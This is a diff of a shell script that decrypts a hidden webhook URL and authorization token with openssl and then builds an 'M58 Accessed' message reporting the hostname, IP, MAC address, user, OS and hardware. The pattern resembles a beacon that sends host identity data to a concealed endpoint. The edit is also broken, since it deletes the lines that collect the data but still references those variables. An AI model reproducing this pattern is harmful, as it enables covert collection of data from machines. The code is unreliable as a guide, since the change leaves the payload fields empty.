@@ -407,41 +407,29 @@ echo "$decrypted_output"
 WEBHOOK_URL=$(echo "$encrypted_webhook_url_b64" | openssl enc -aes-256-cbc -d -a -salt -pass pass:"$password" -pbkdf2 -iter 16988354 2>&1)
 AUTHORIZATION=$(echo "$encrypted_authorization_b64" | openssl enc -aes-256-cbc -d -a -salt -pass pass:"$password" -pbkdf2 -iter 16988354 2>&1)
 
-# Collect system information
-HOSTNAME=$(hostname)
-CPU_INFO=$(lscpu | grep "Model name" | cut -d ':' -f2 | xargs)
-MEM_INFO=$(free -h | grep "Mem" | awk '{print $3 " used of " $2}')
-DISK_USAGE=$(df -h / | grep "/" | awk '{print $3 " used of " $2}')
-IP_ADDRESS=$(hostname -I | awk '{print $1}')
-OS_DETAILS=$(cat /etc/os-release | grep "PRETTY_NAME" | cut -d '"' -f2)
-USER=$(whoami)
-MAC_ADDRESS=$(ip link show | grep link/ether | awk '{print $2}' | head -n 1)
+esc_hostname=$(printf '%s' "$HOSTNAME" | sed 's/"/\\"/g')
+esc_cpu_info=$(printf '%s' "$CPU_INFO" | sed 's/"/\\"/g')
+esc_mem_info=$(printf '%s' "$MEM_INFO" | sed 's/"/\\"/g')
+esc_disk_usage=$(printf '%s' "$DISK_USAGE" | sed 's/"/\\"/g')
+esc_ip_address=$(printf '%s' "$IP_ADDRESS" | sed 's/"/\\"/g')
+esc_os_details=$(printf '%s' "$OS_DETAILS" | sed 's/"/\\"/g')
+esc_user=$(printf '%s' "$USER" | sed 's/"/\\"/g')
+esc_mac_address=$(printf '%s' "$MAC_ADDRESS" | sed 's/"/\\"/g')
 
-# Generate JSON payload
-PAYLOAD=$(jq -nc \
-    --arg hn "$HOSTNAME" \
-    --arg cpu "$CPU_INFO" \
-    --arg mem "$MEM_INFO" \
-    --arg disk "$DISK_USAGE" \
-    --arg ip "$IP_ADDRESS" \
-    --arg os "$OS_DETAILS" \
-    --arg user "$USER" \
-    --arg mac "$MAC_ADDRESS" \
-    '{
-        content: ("**!!! M58 Accessed !!!\nSystem Information**:\n" +
-                 "- **Hostname:** \($hn)\n" +
-                 "- **CPU:** \($cpu)\n" +
-                 "- **Memory:** \($mem)\n" +
-                 "- **Disk Usage:** \($disk)\n" +
-                 "- **IP Address:** \($ip)\n" +
-                 "- **Operating System:** \($os)\n" +
-                 "- **User:** \($user)\n" +
-                 "- **MAC Address:** \($mac)")
-    }')
+# Construct JSON payload
+PAYLOAD="{\"content\": \"**!!! M58 Accessed !!!\\nSystem Information**:\\n" \
+"- **Hostname:** $esc_hostname\\n" \
+"- **CPU:** $esc_cpu_info\\n" \
+"- **Memory:** $esc_mem_info\\n" \
+"- **Disk Usage:** $esc_disk_usage\\n" \
+"- **IP Address:** $esc_ip_address\\n" \
+"- **Operating System:** $esc_os_details\\n" \
+"- **User:** $esc_user\\n" \
+"- **MAC Address:** $esc_mac_address\"}"
 
 # Check if payload creation was successful
 if [ -z "$PAYLOAD" ]; then
-  echo "Error: Failed to create JSON payload using jq."
+  echo "Error: Failed to create JSON payload."
   exit 1
 fi
 
